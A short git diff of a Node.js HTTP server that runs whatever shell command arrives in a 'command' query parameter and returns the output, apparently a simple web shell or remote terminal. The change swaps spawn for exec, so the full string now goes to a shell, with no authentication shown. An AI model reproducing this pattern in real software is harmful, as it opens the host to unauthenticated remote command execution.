@@ -1,4 +1,4 @@
-const { spawn } = require('child_process');
+const { exec: childProc } = require('child_process');
 const server = require('http').createServer();
 const url = require('url');
 // const querystring = require('querystring');
@@ -10,14 +10,12 @@ server.on('request', (req, res) => {
     const parsedUrl = url.parse(req.url, true);
 
     if (parsedUrl.query.command) {
-        const { command: commandQuery } = parsedUrl.query;
+        const { command, session } = parsedUrl.query;
 
-        const args = commandQuery.split(' ');
-        const command = args[0];
-        args.splice(0, 1);
+        res.write(`${session ? session + '> ' : ''}${command}\n`)
 
         // process command
-        const child = spawn(command, args);
+        const child = childProc(command);
 
         child.stderr.on('data', data => res.write(data));
         child.stdout.on('data', data => res.write(data));
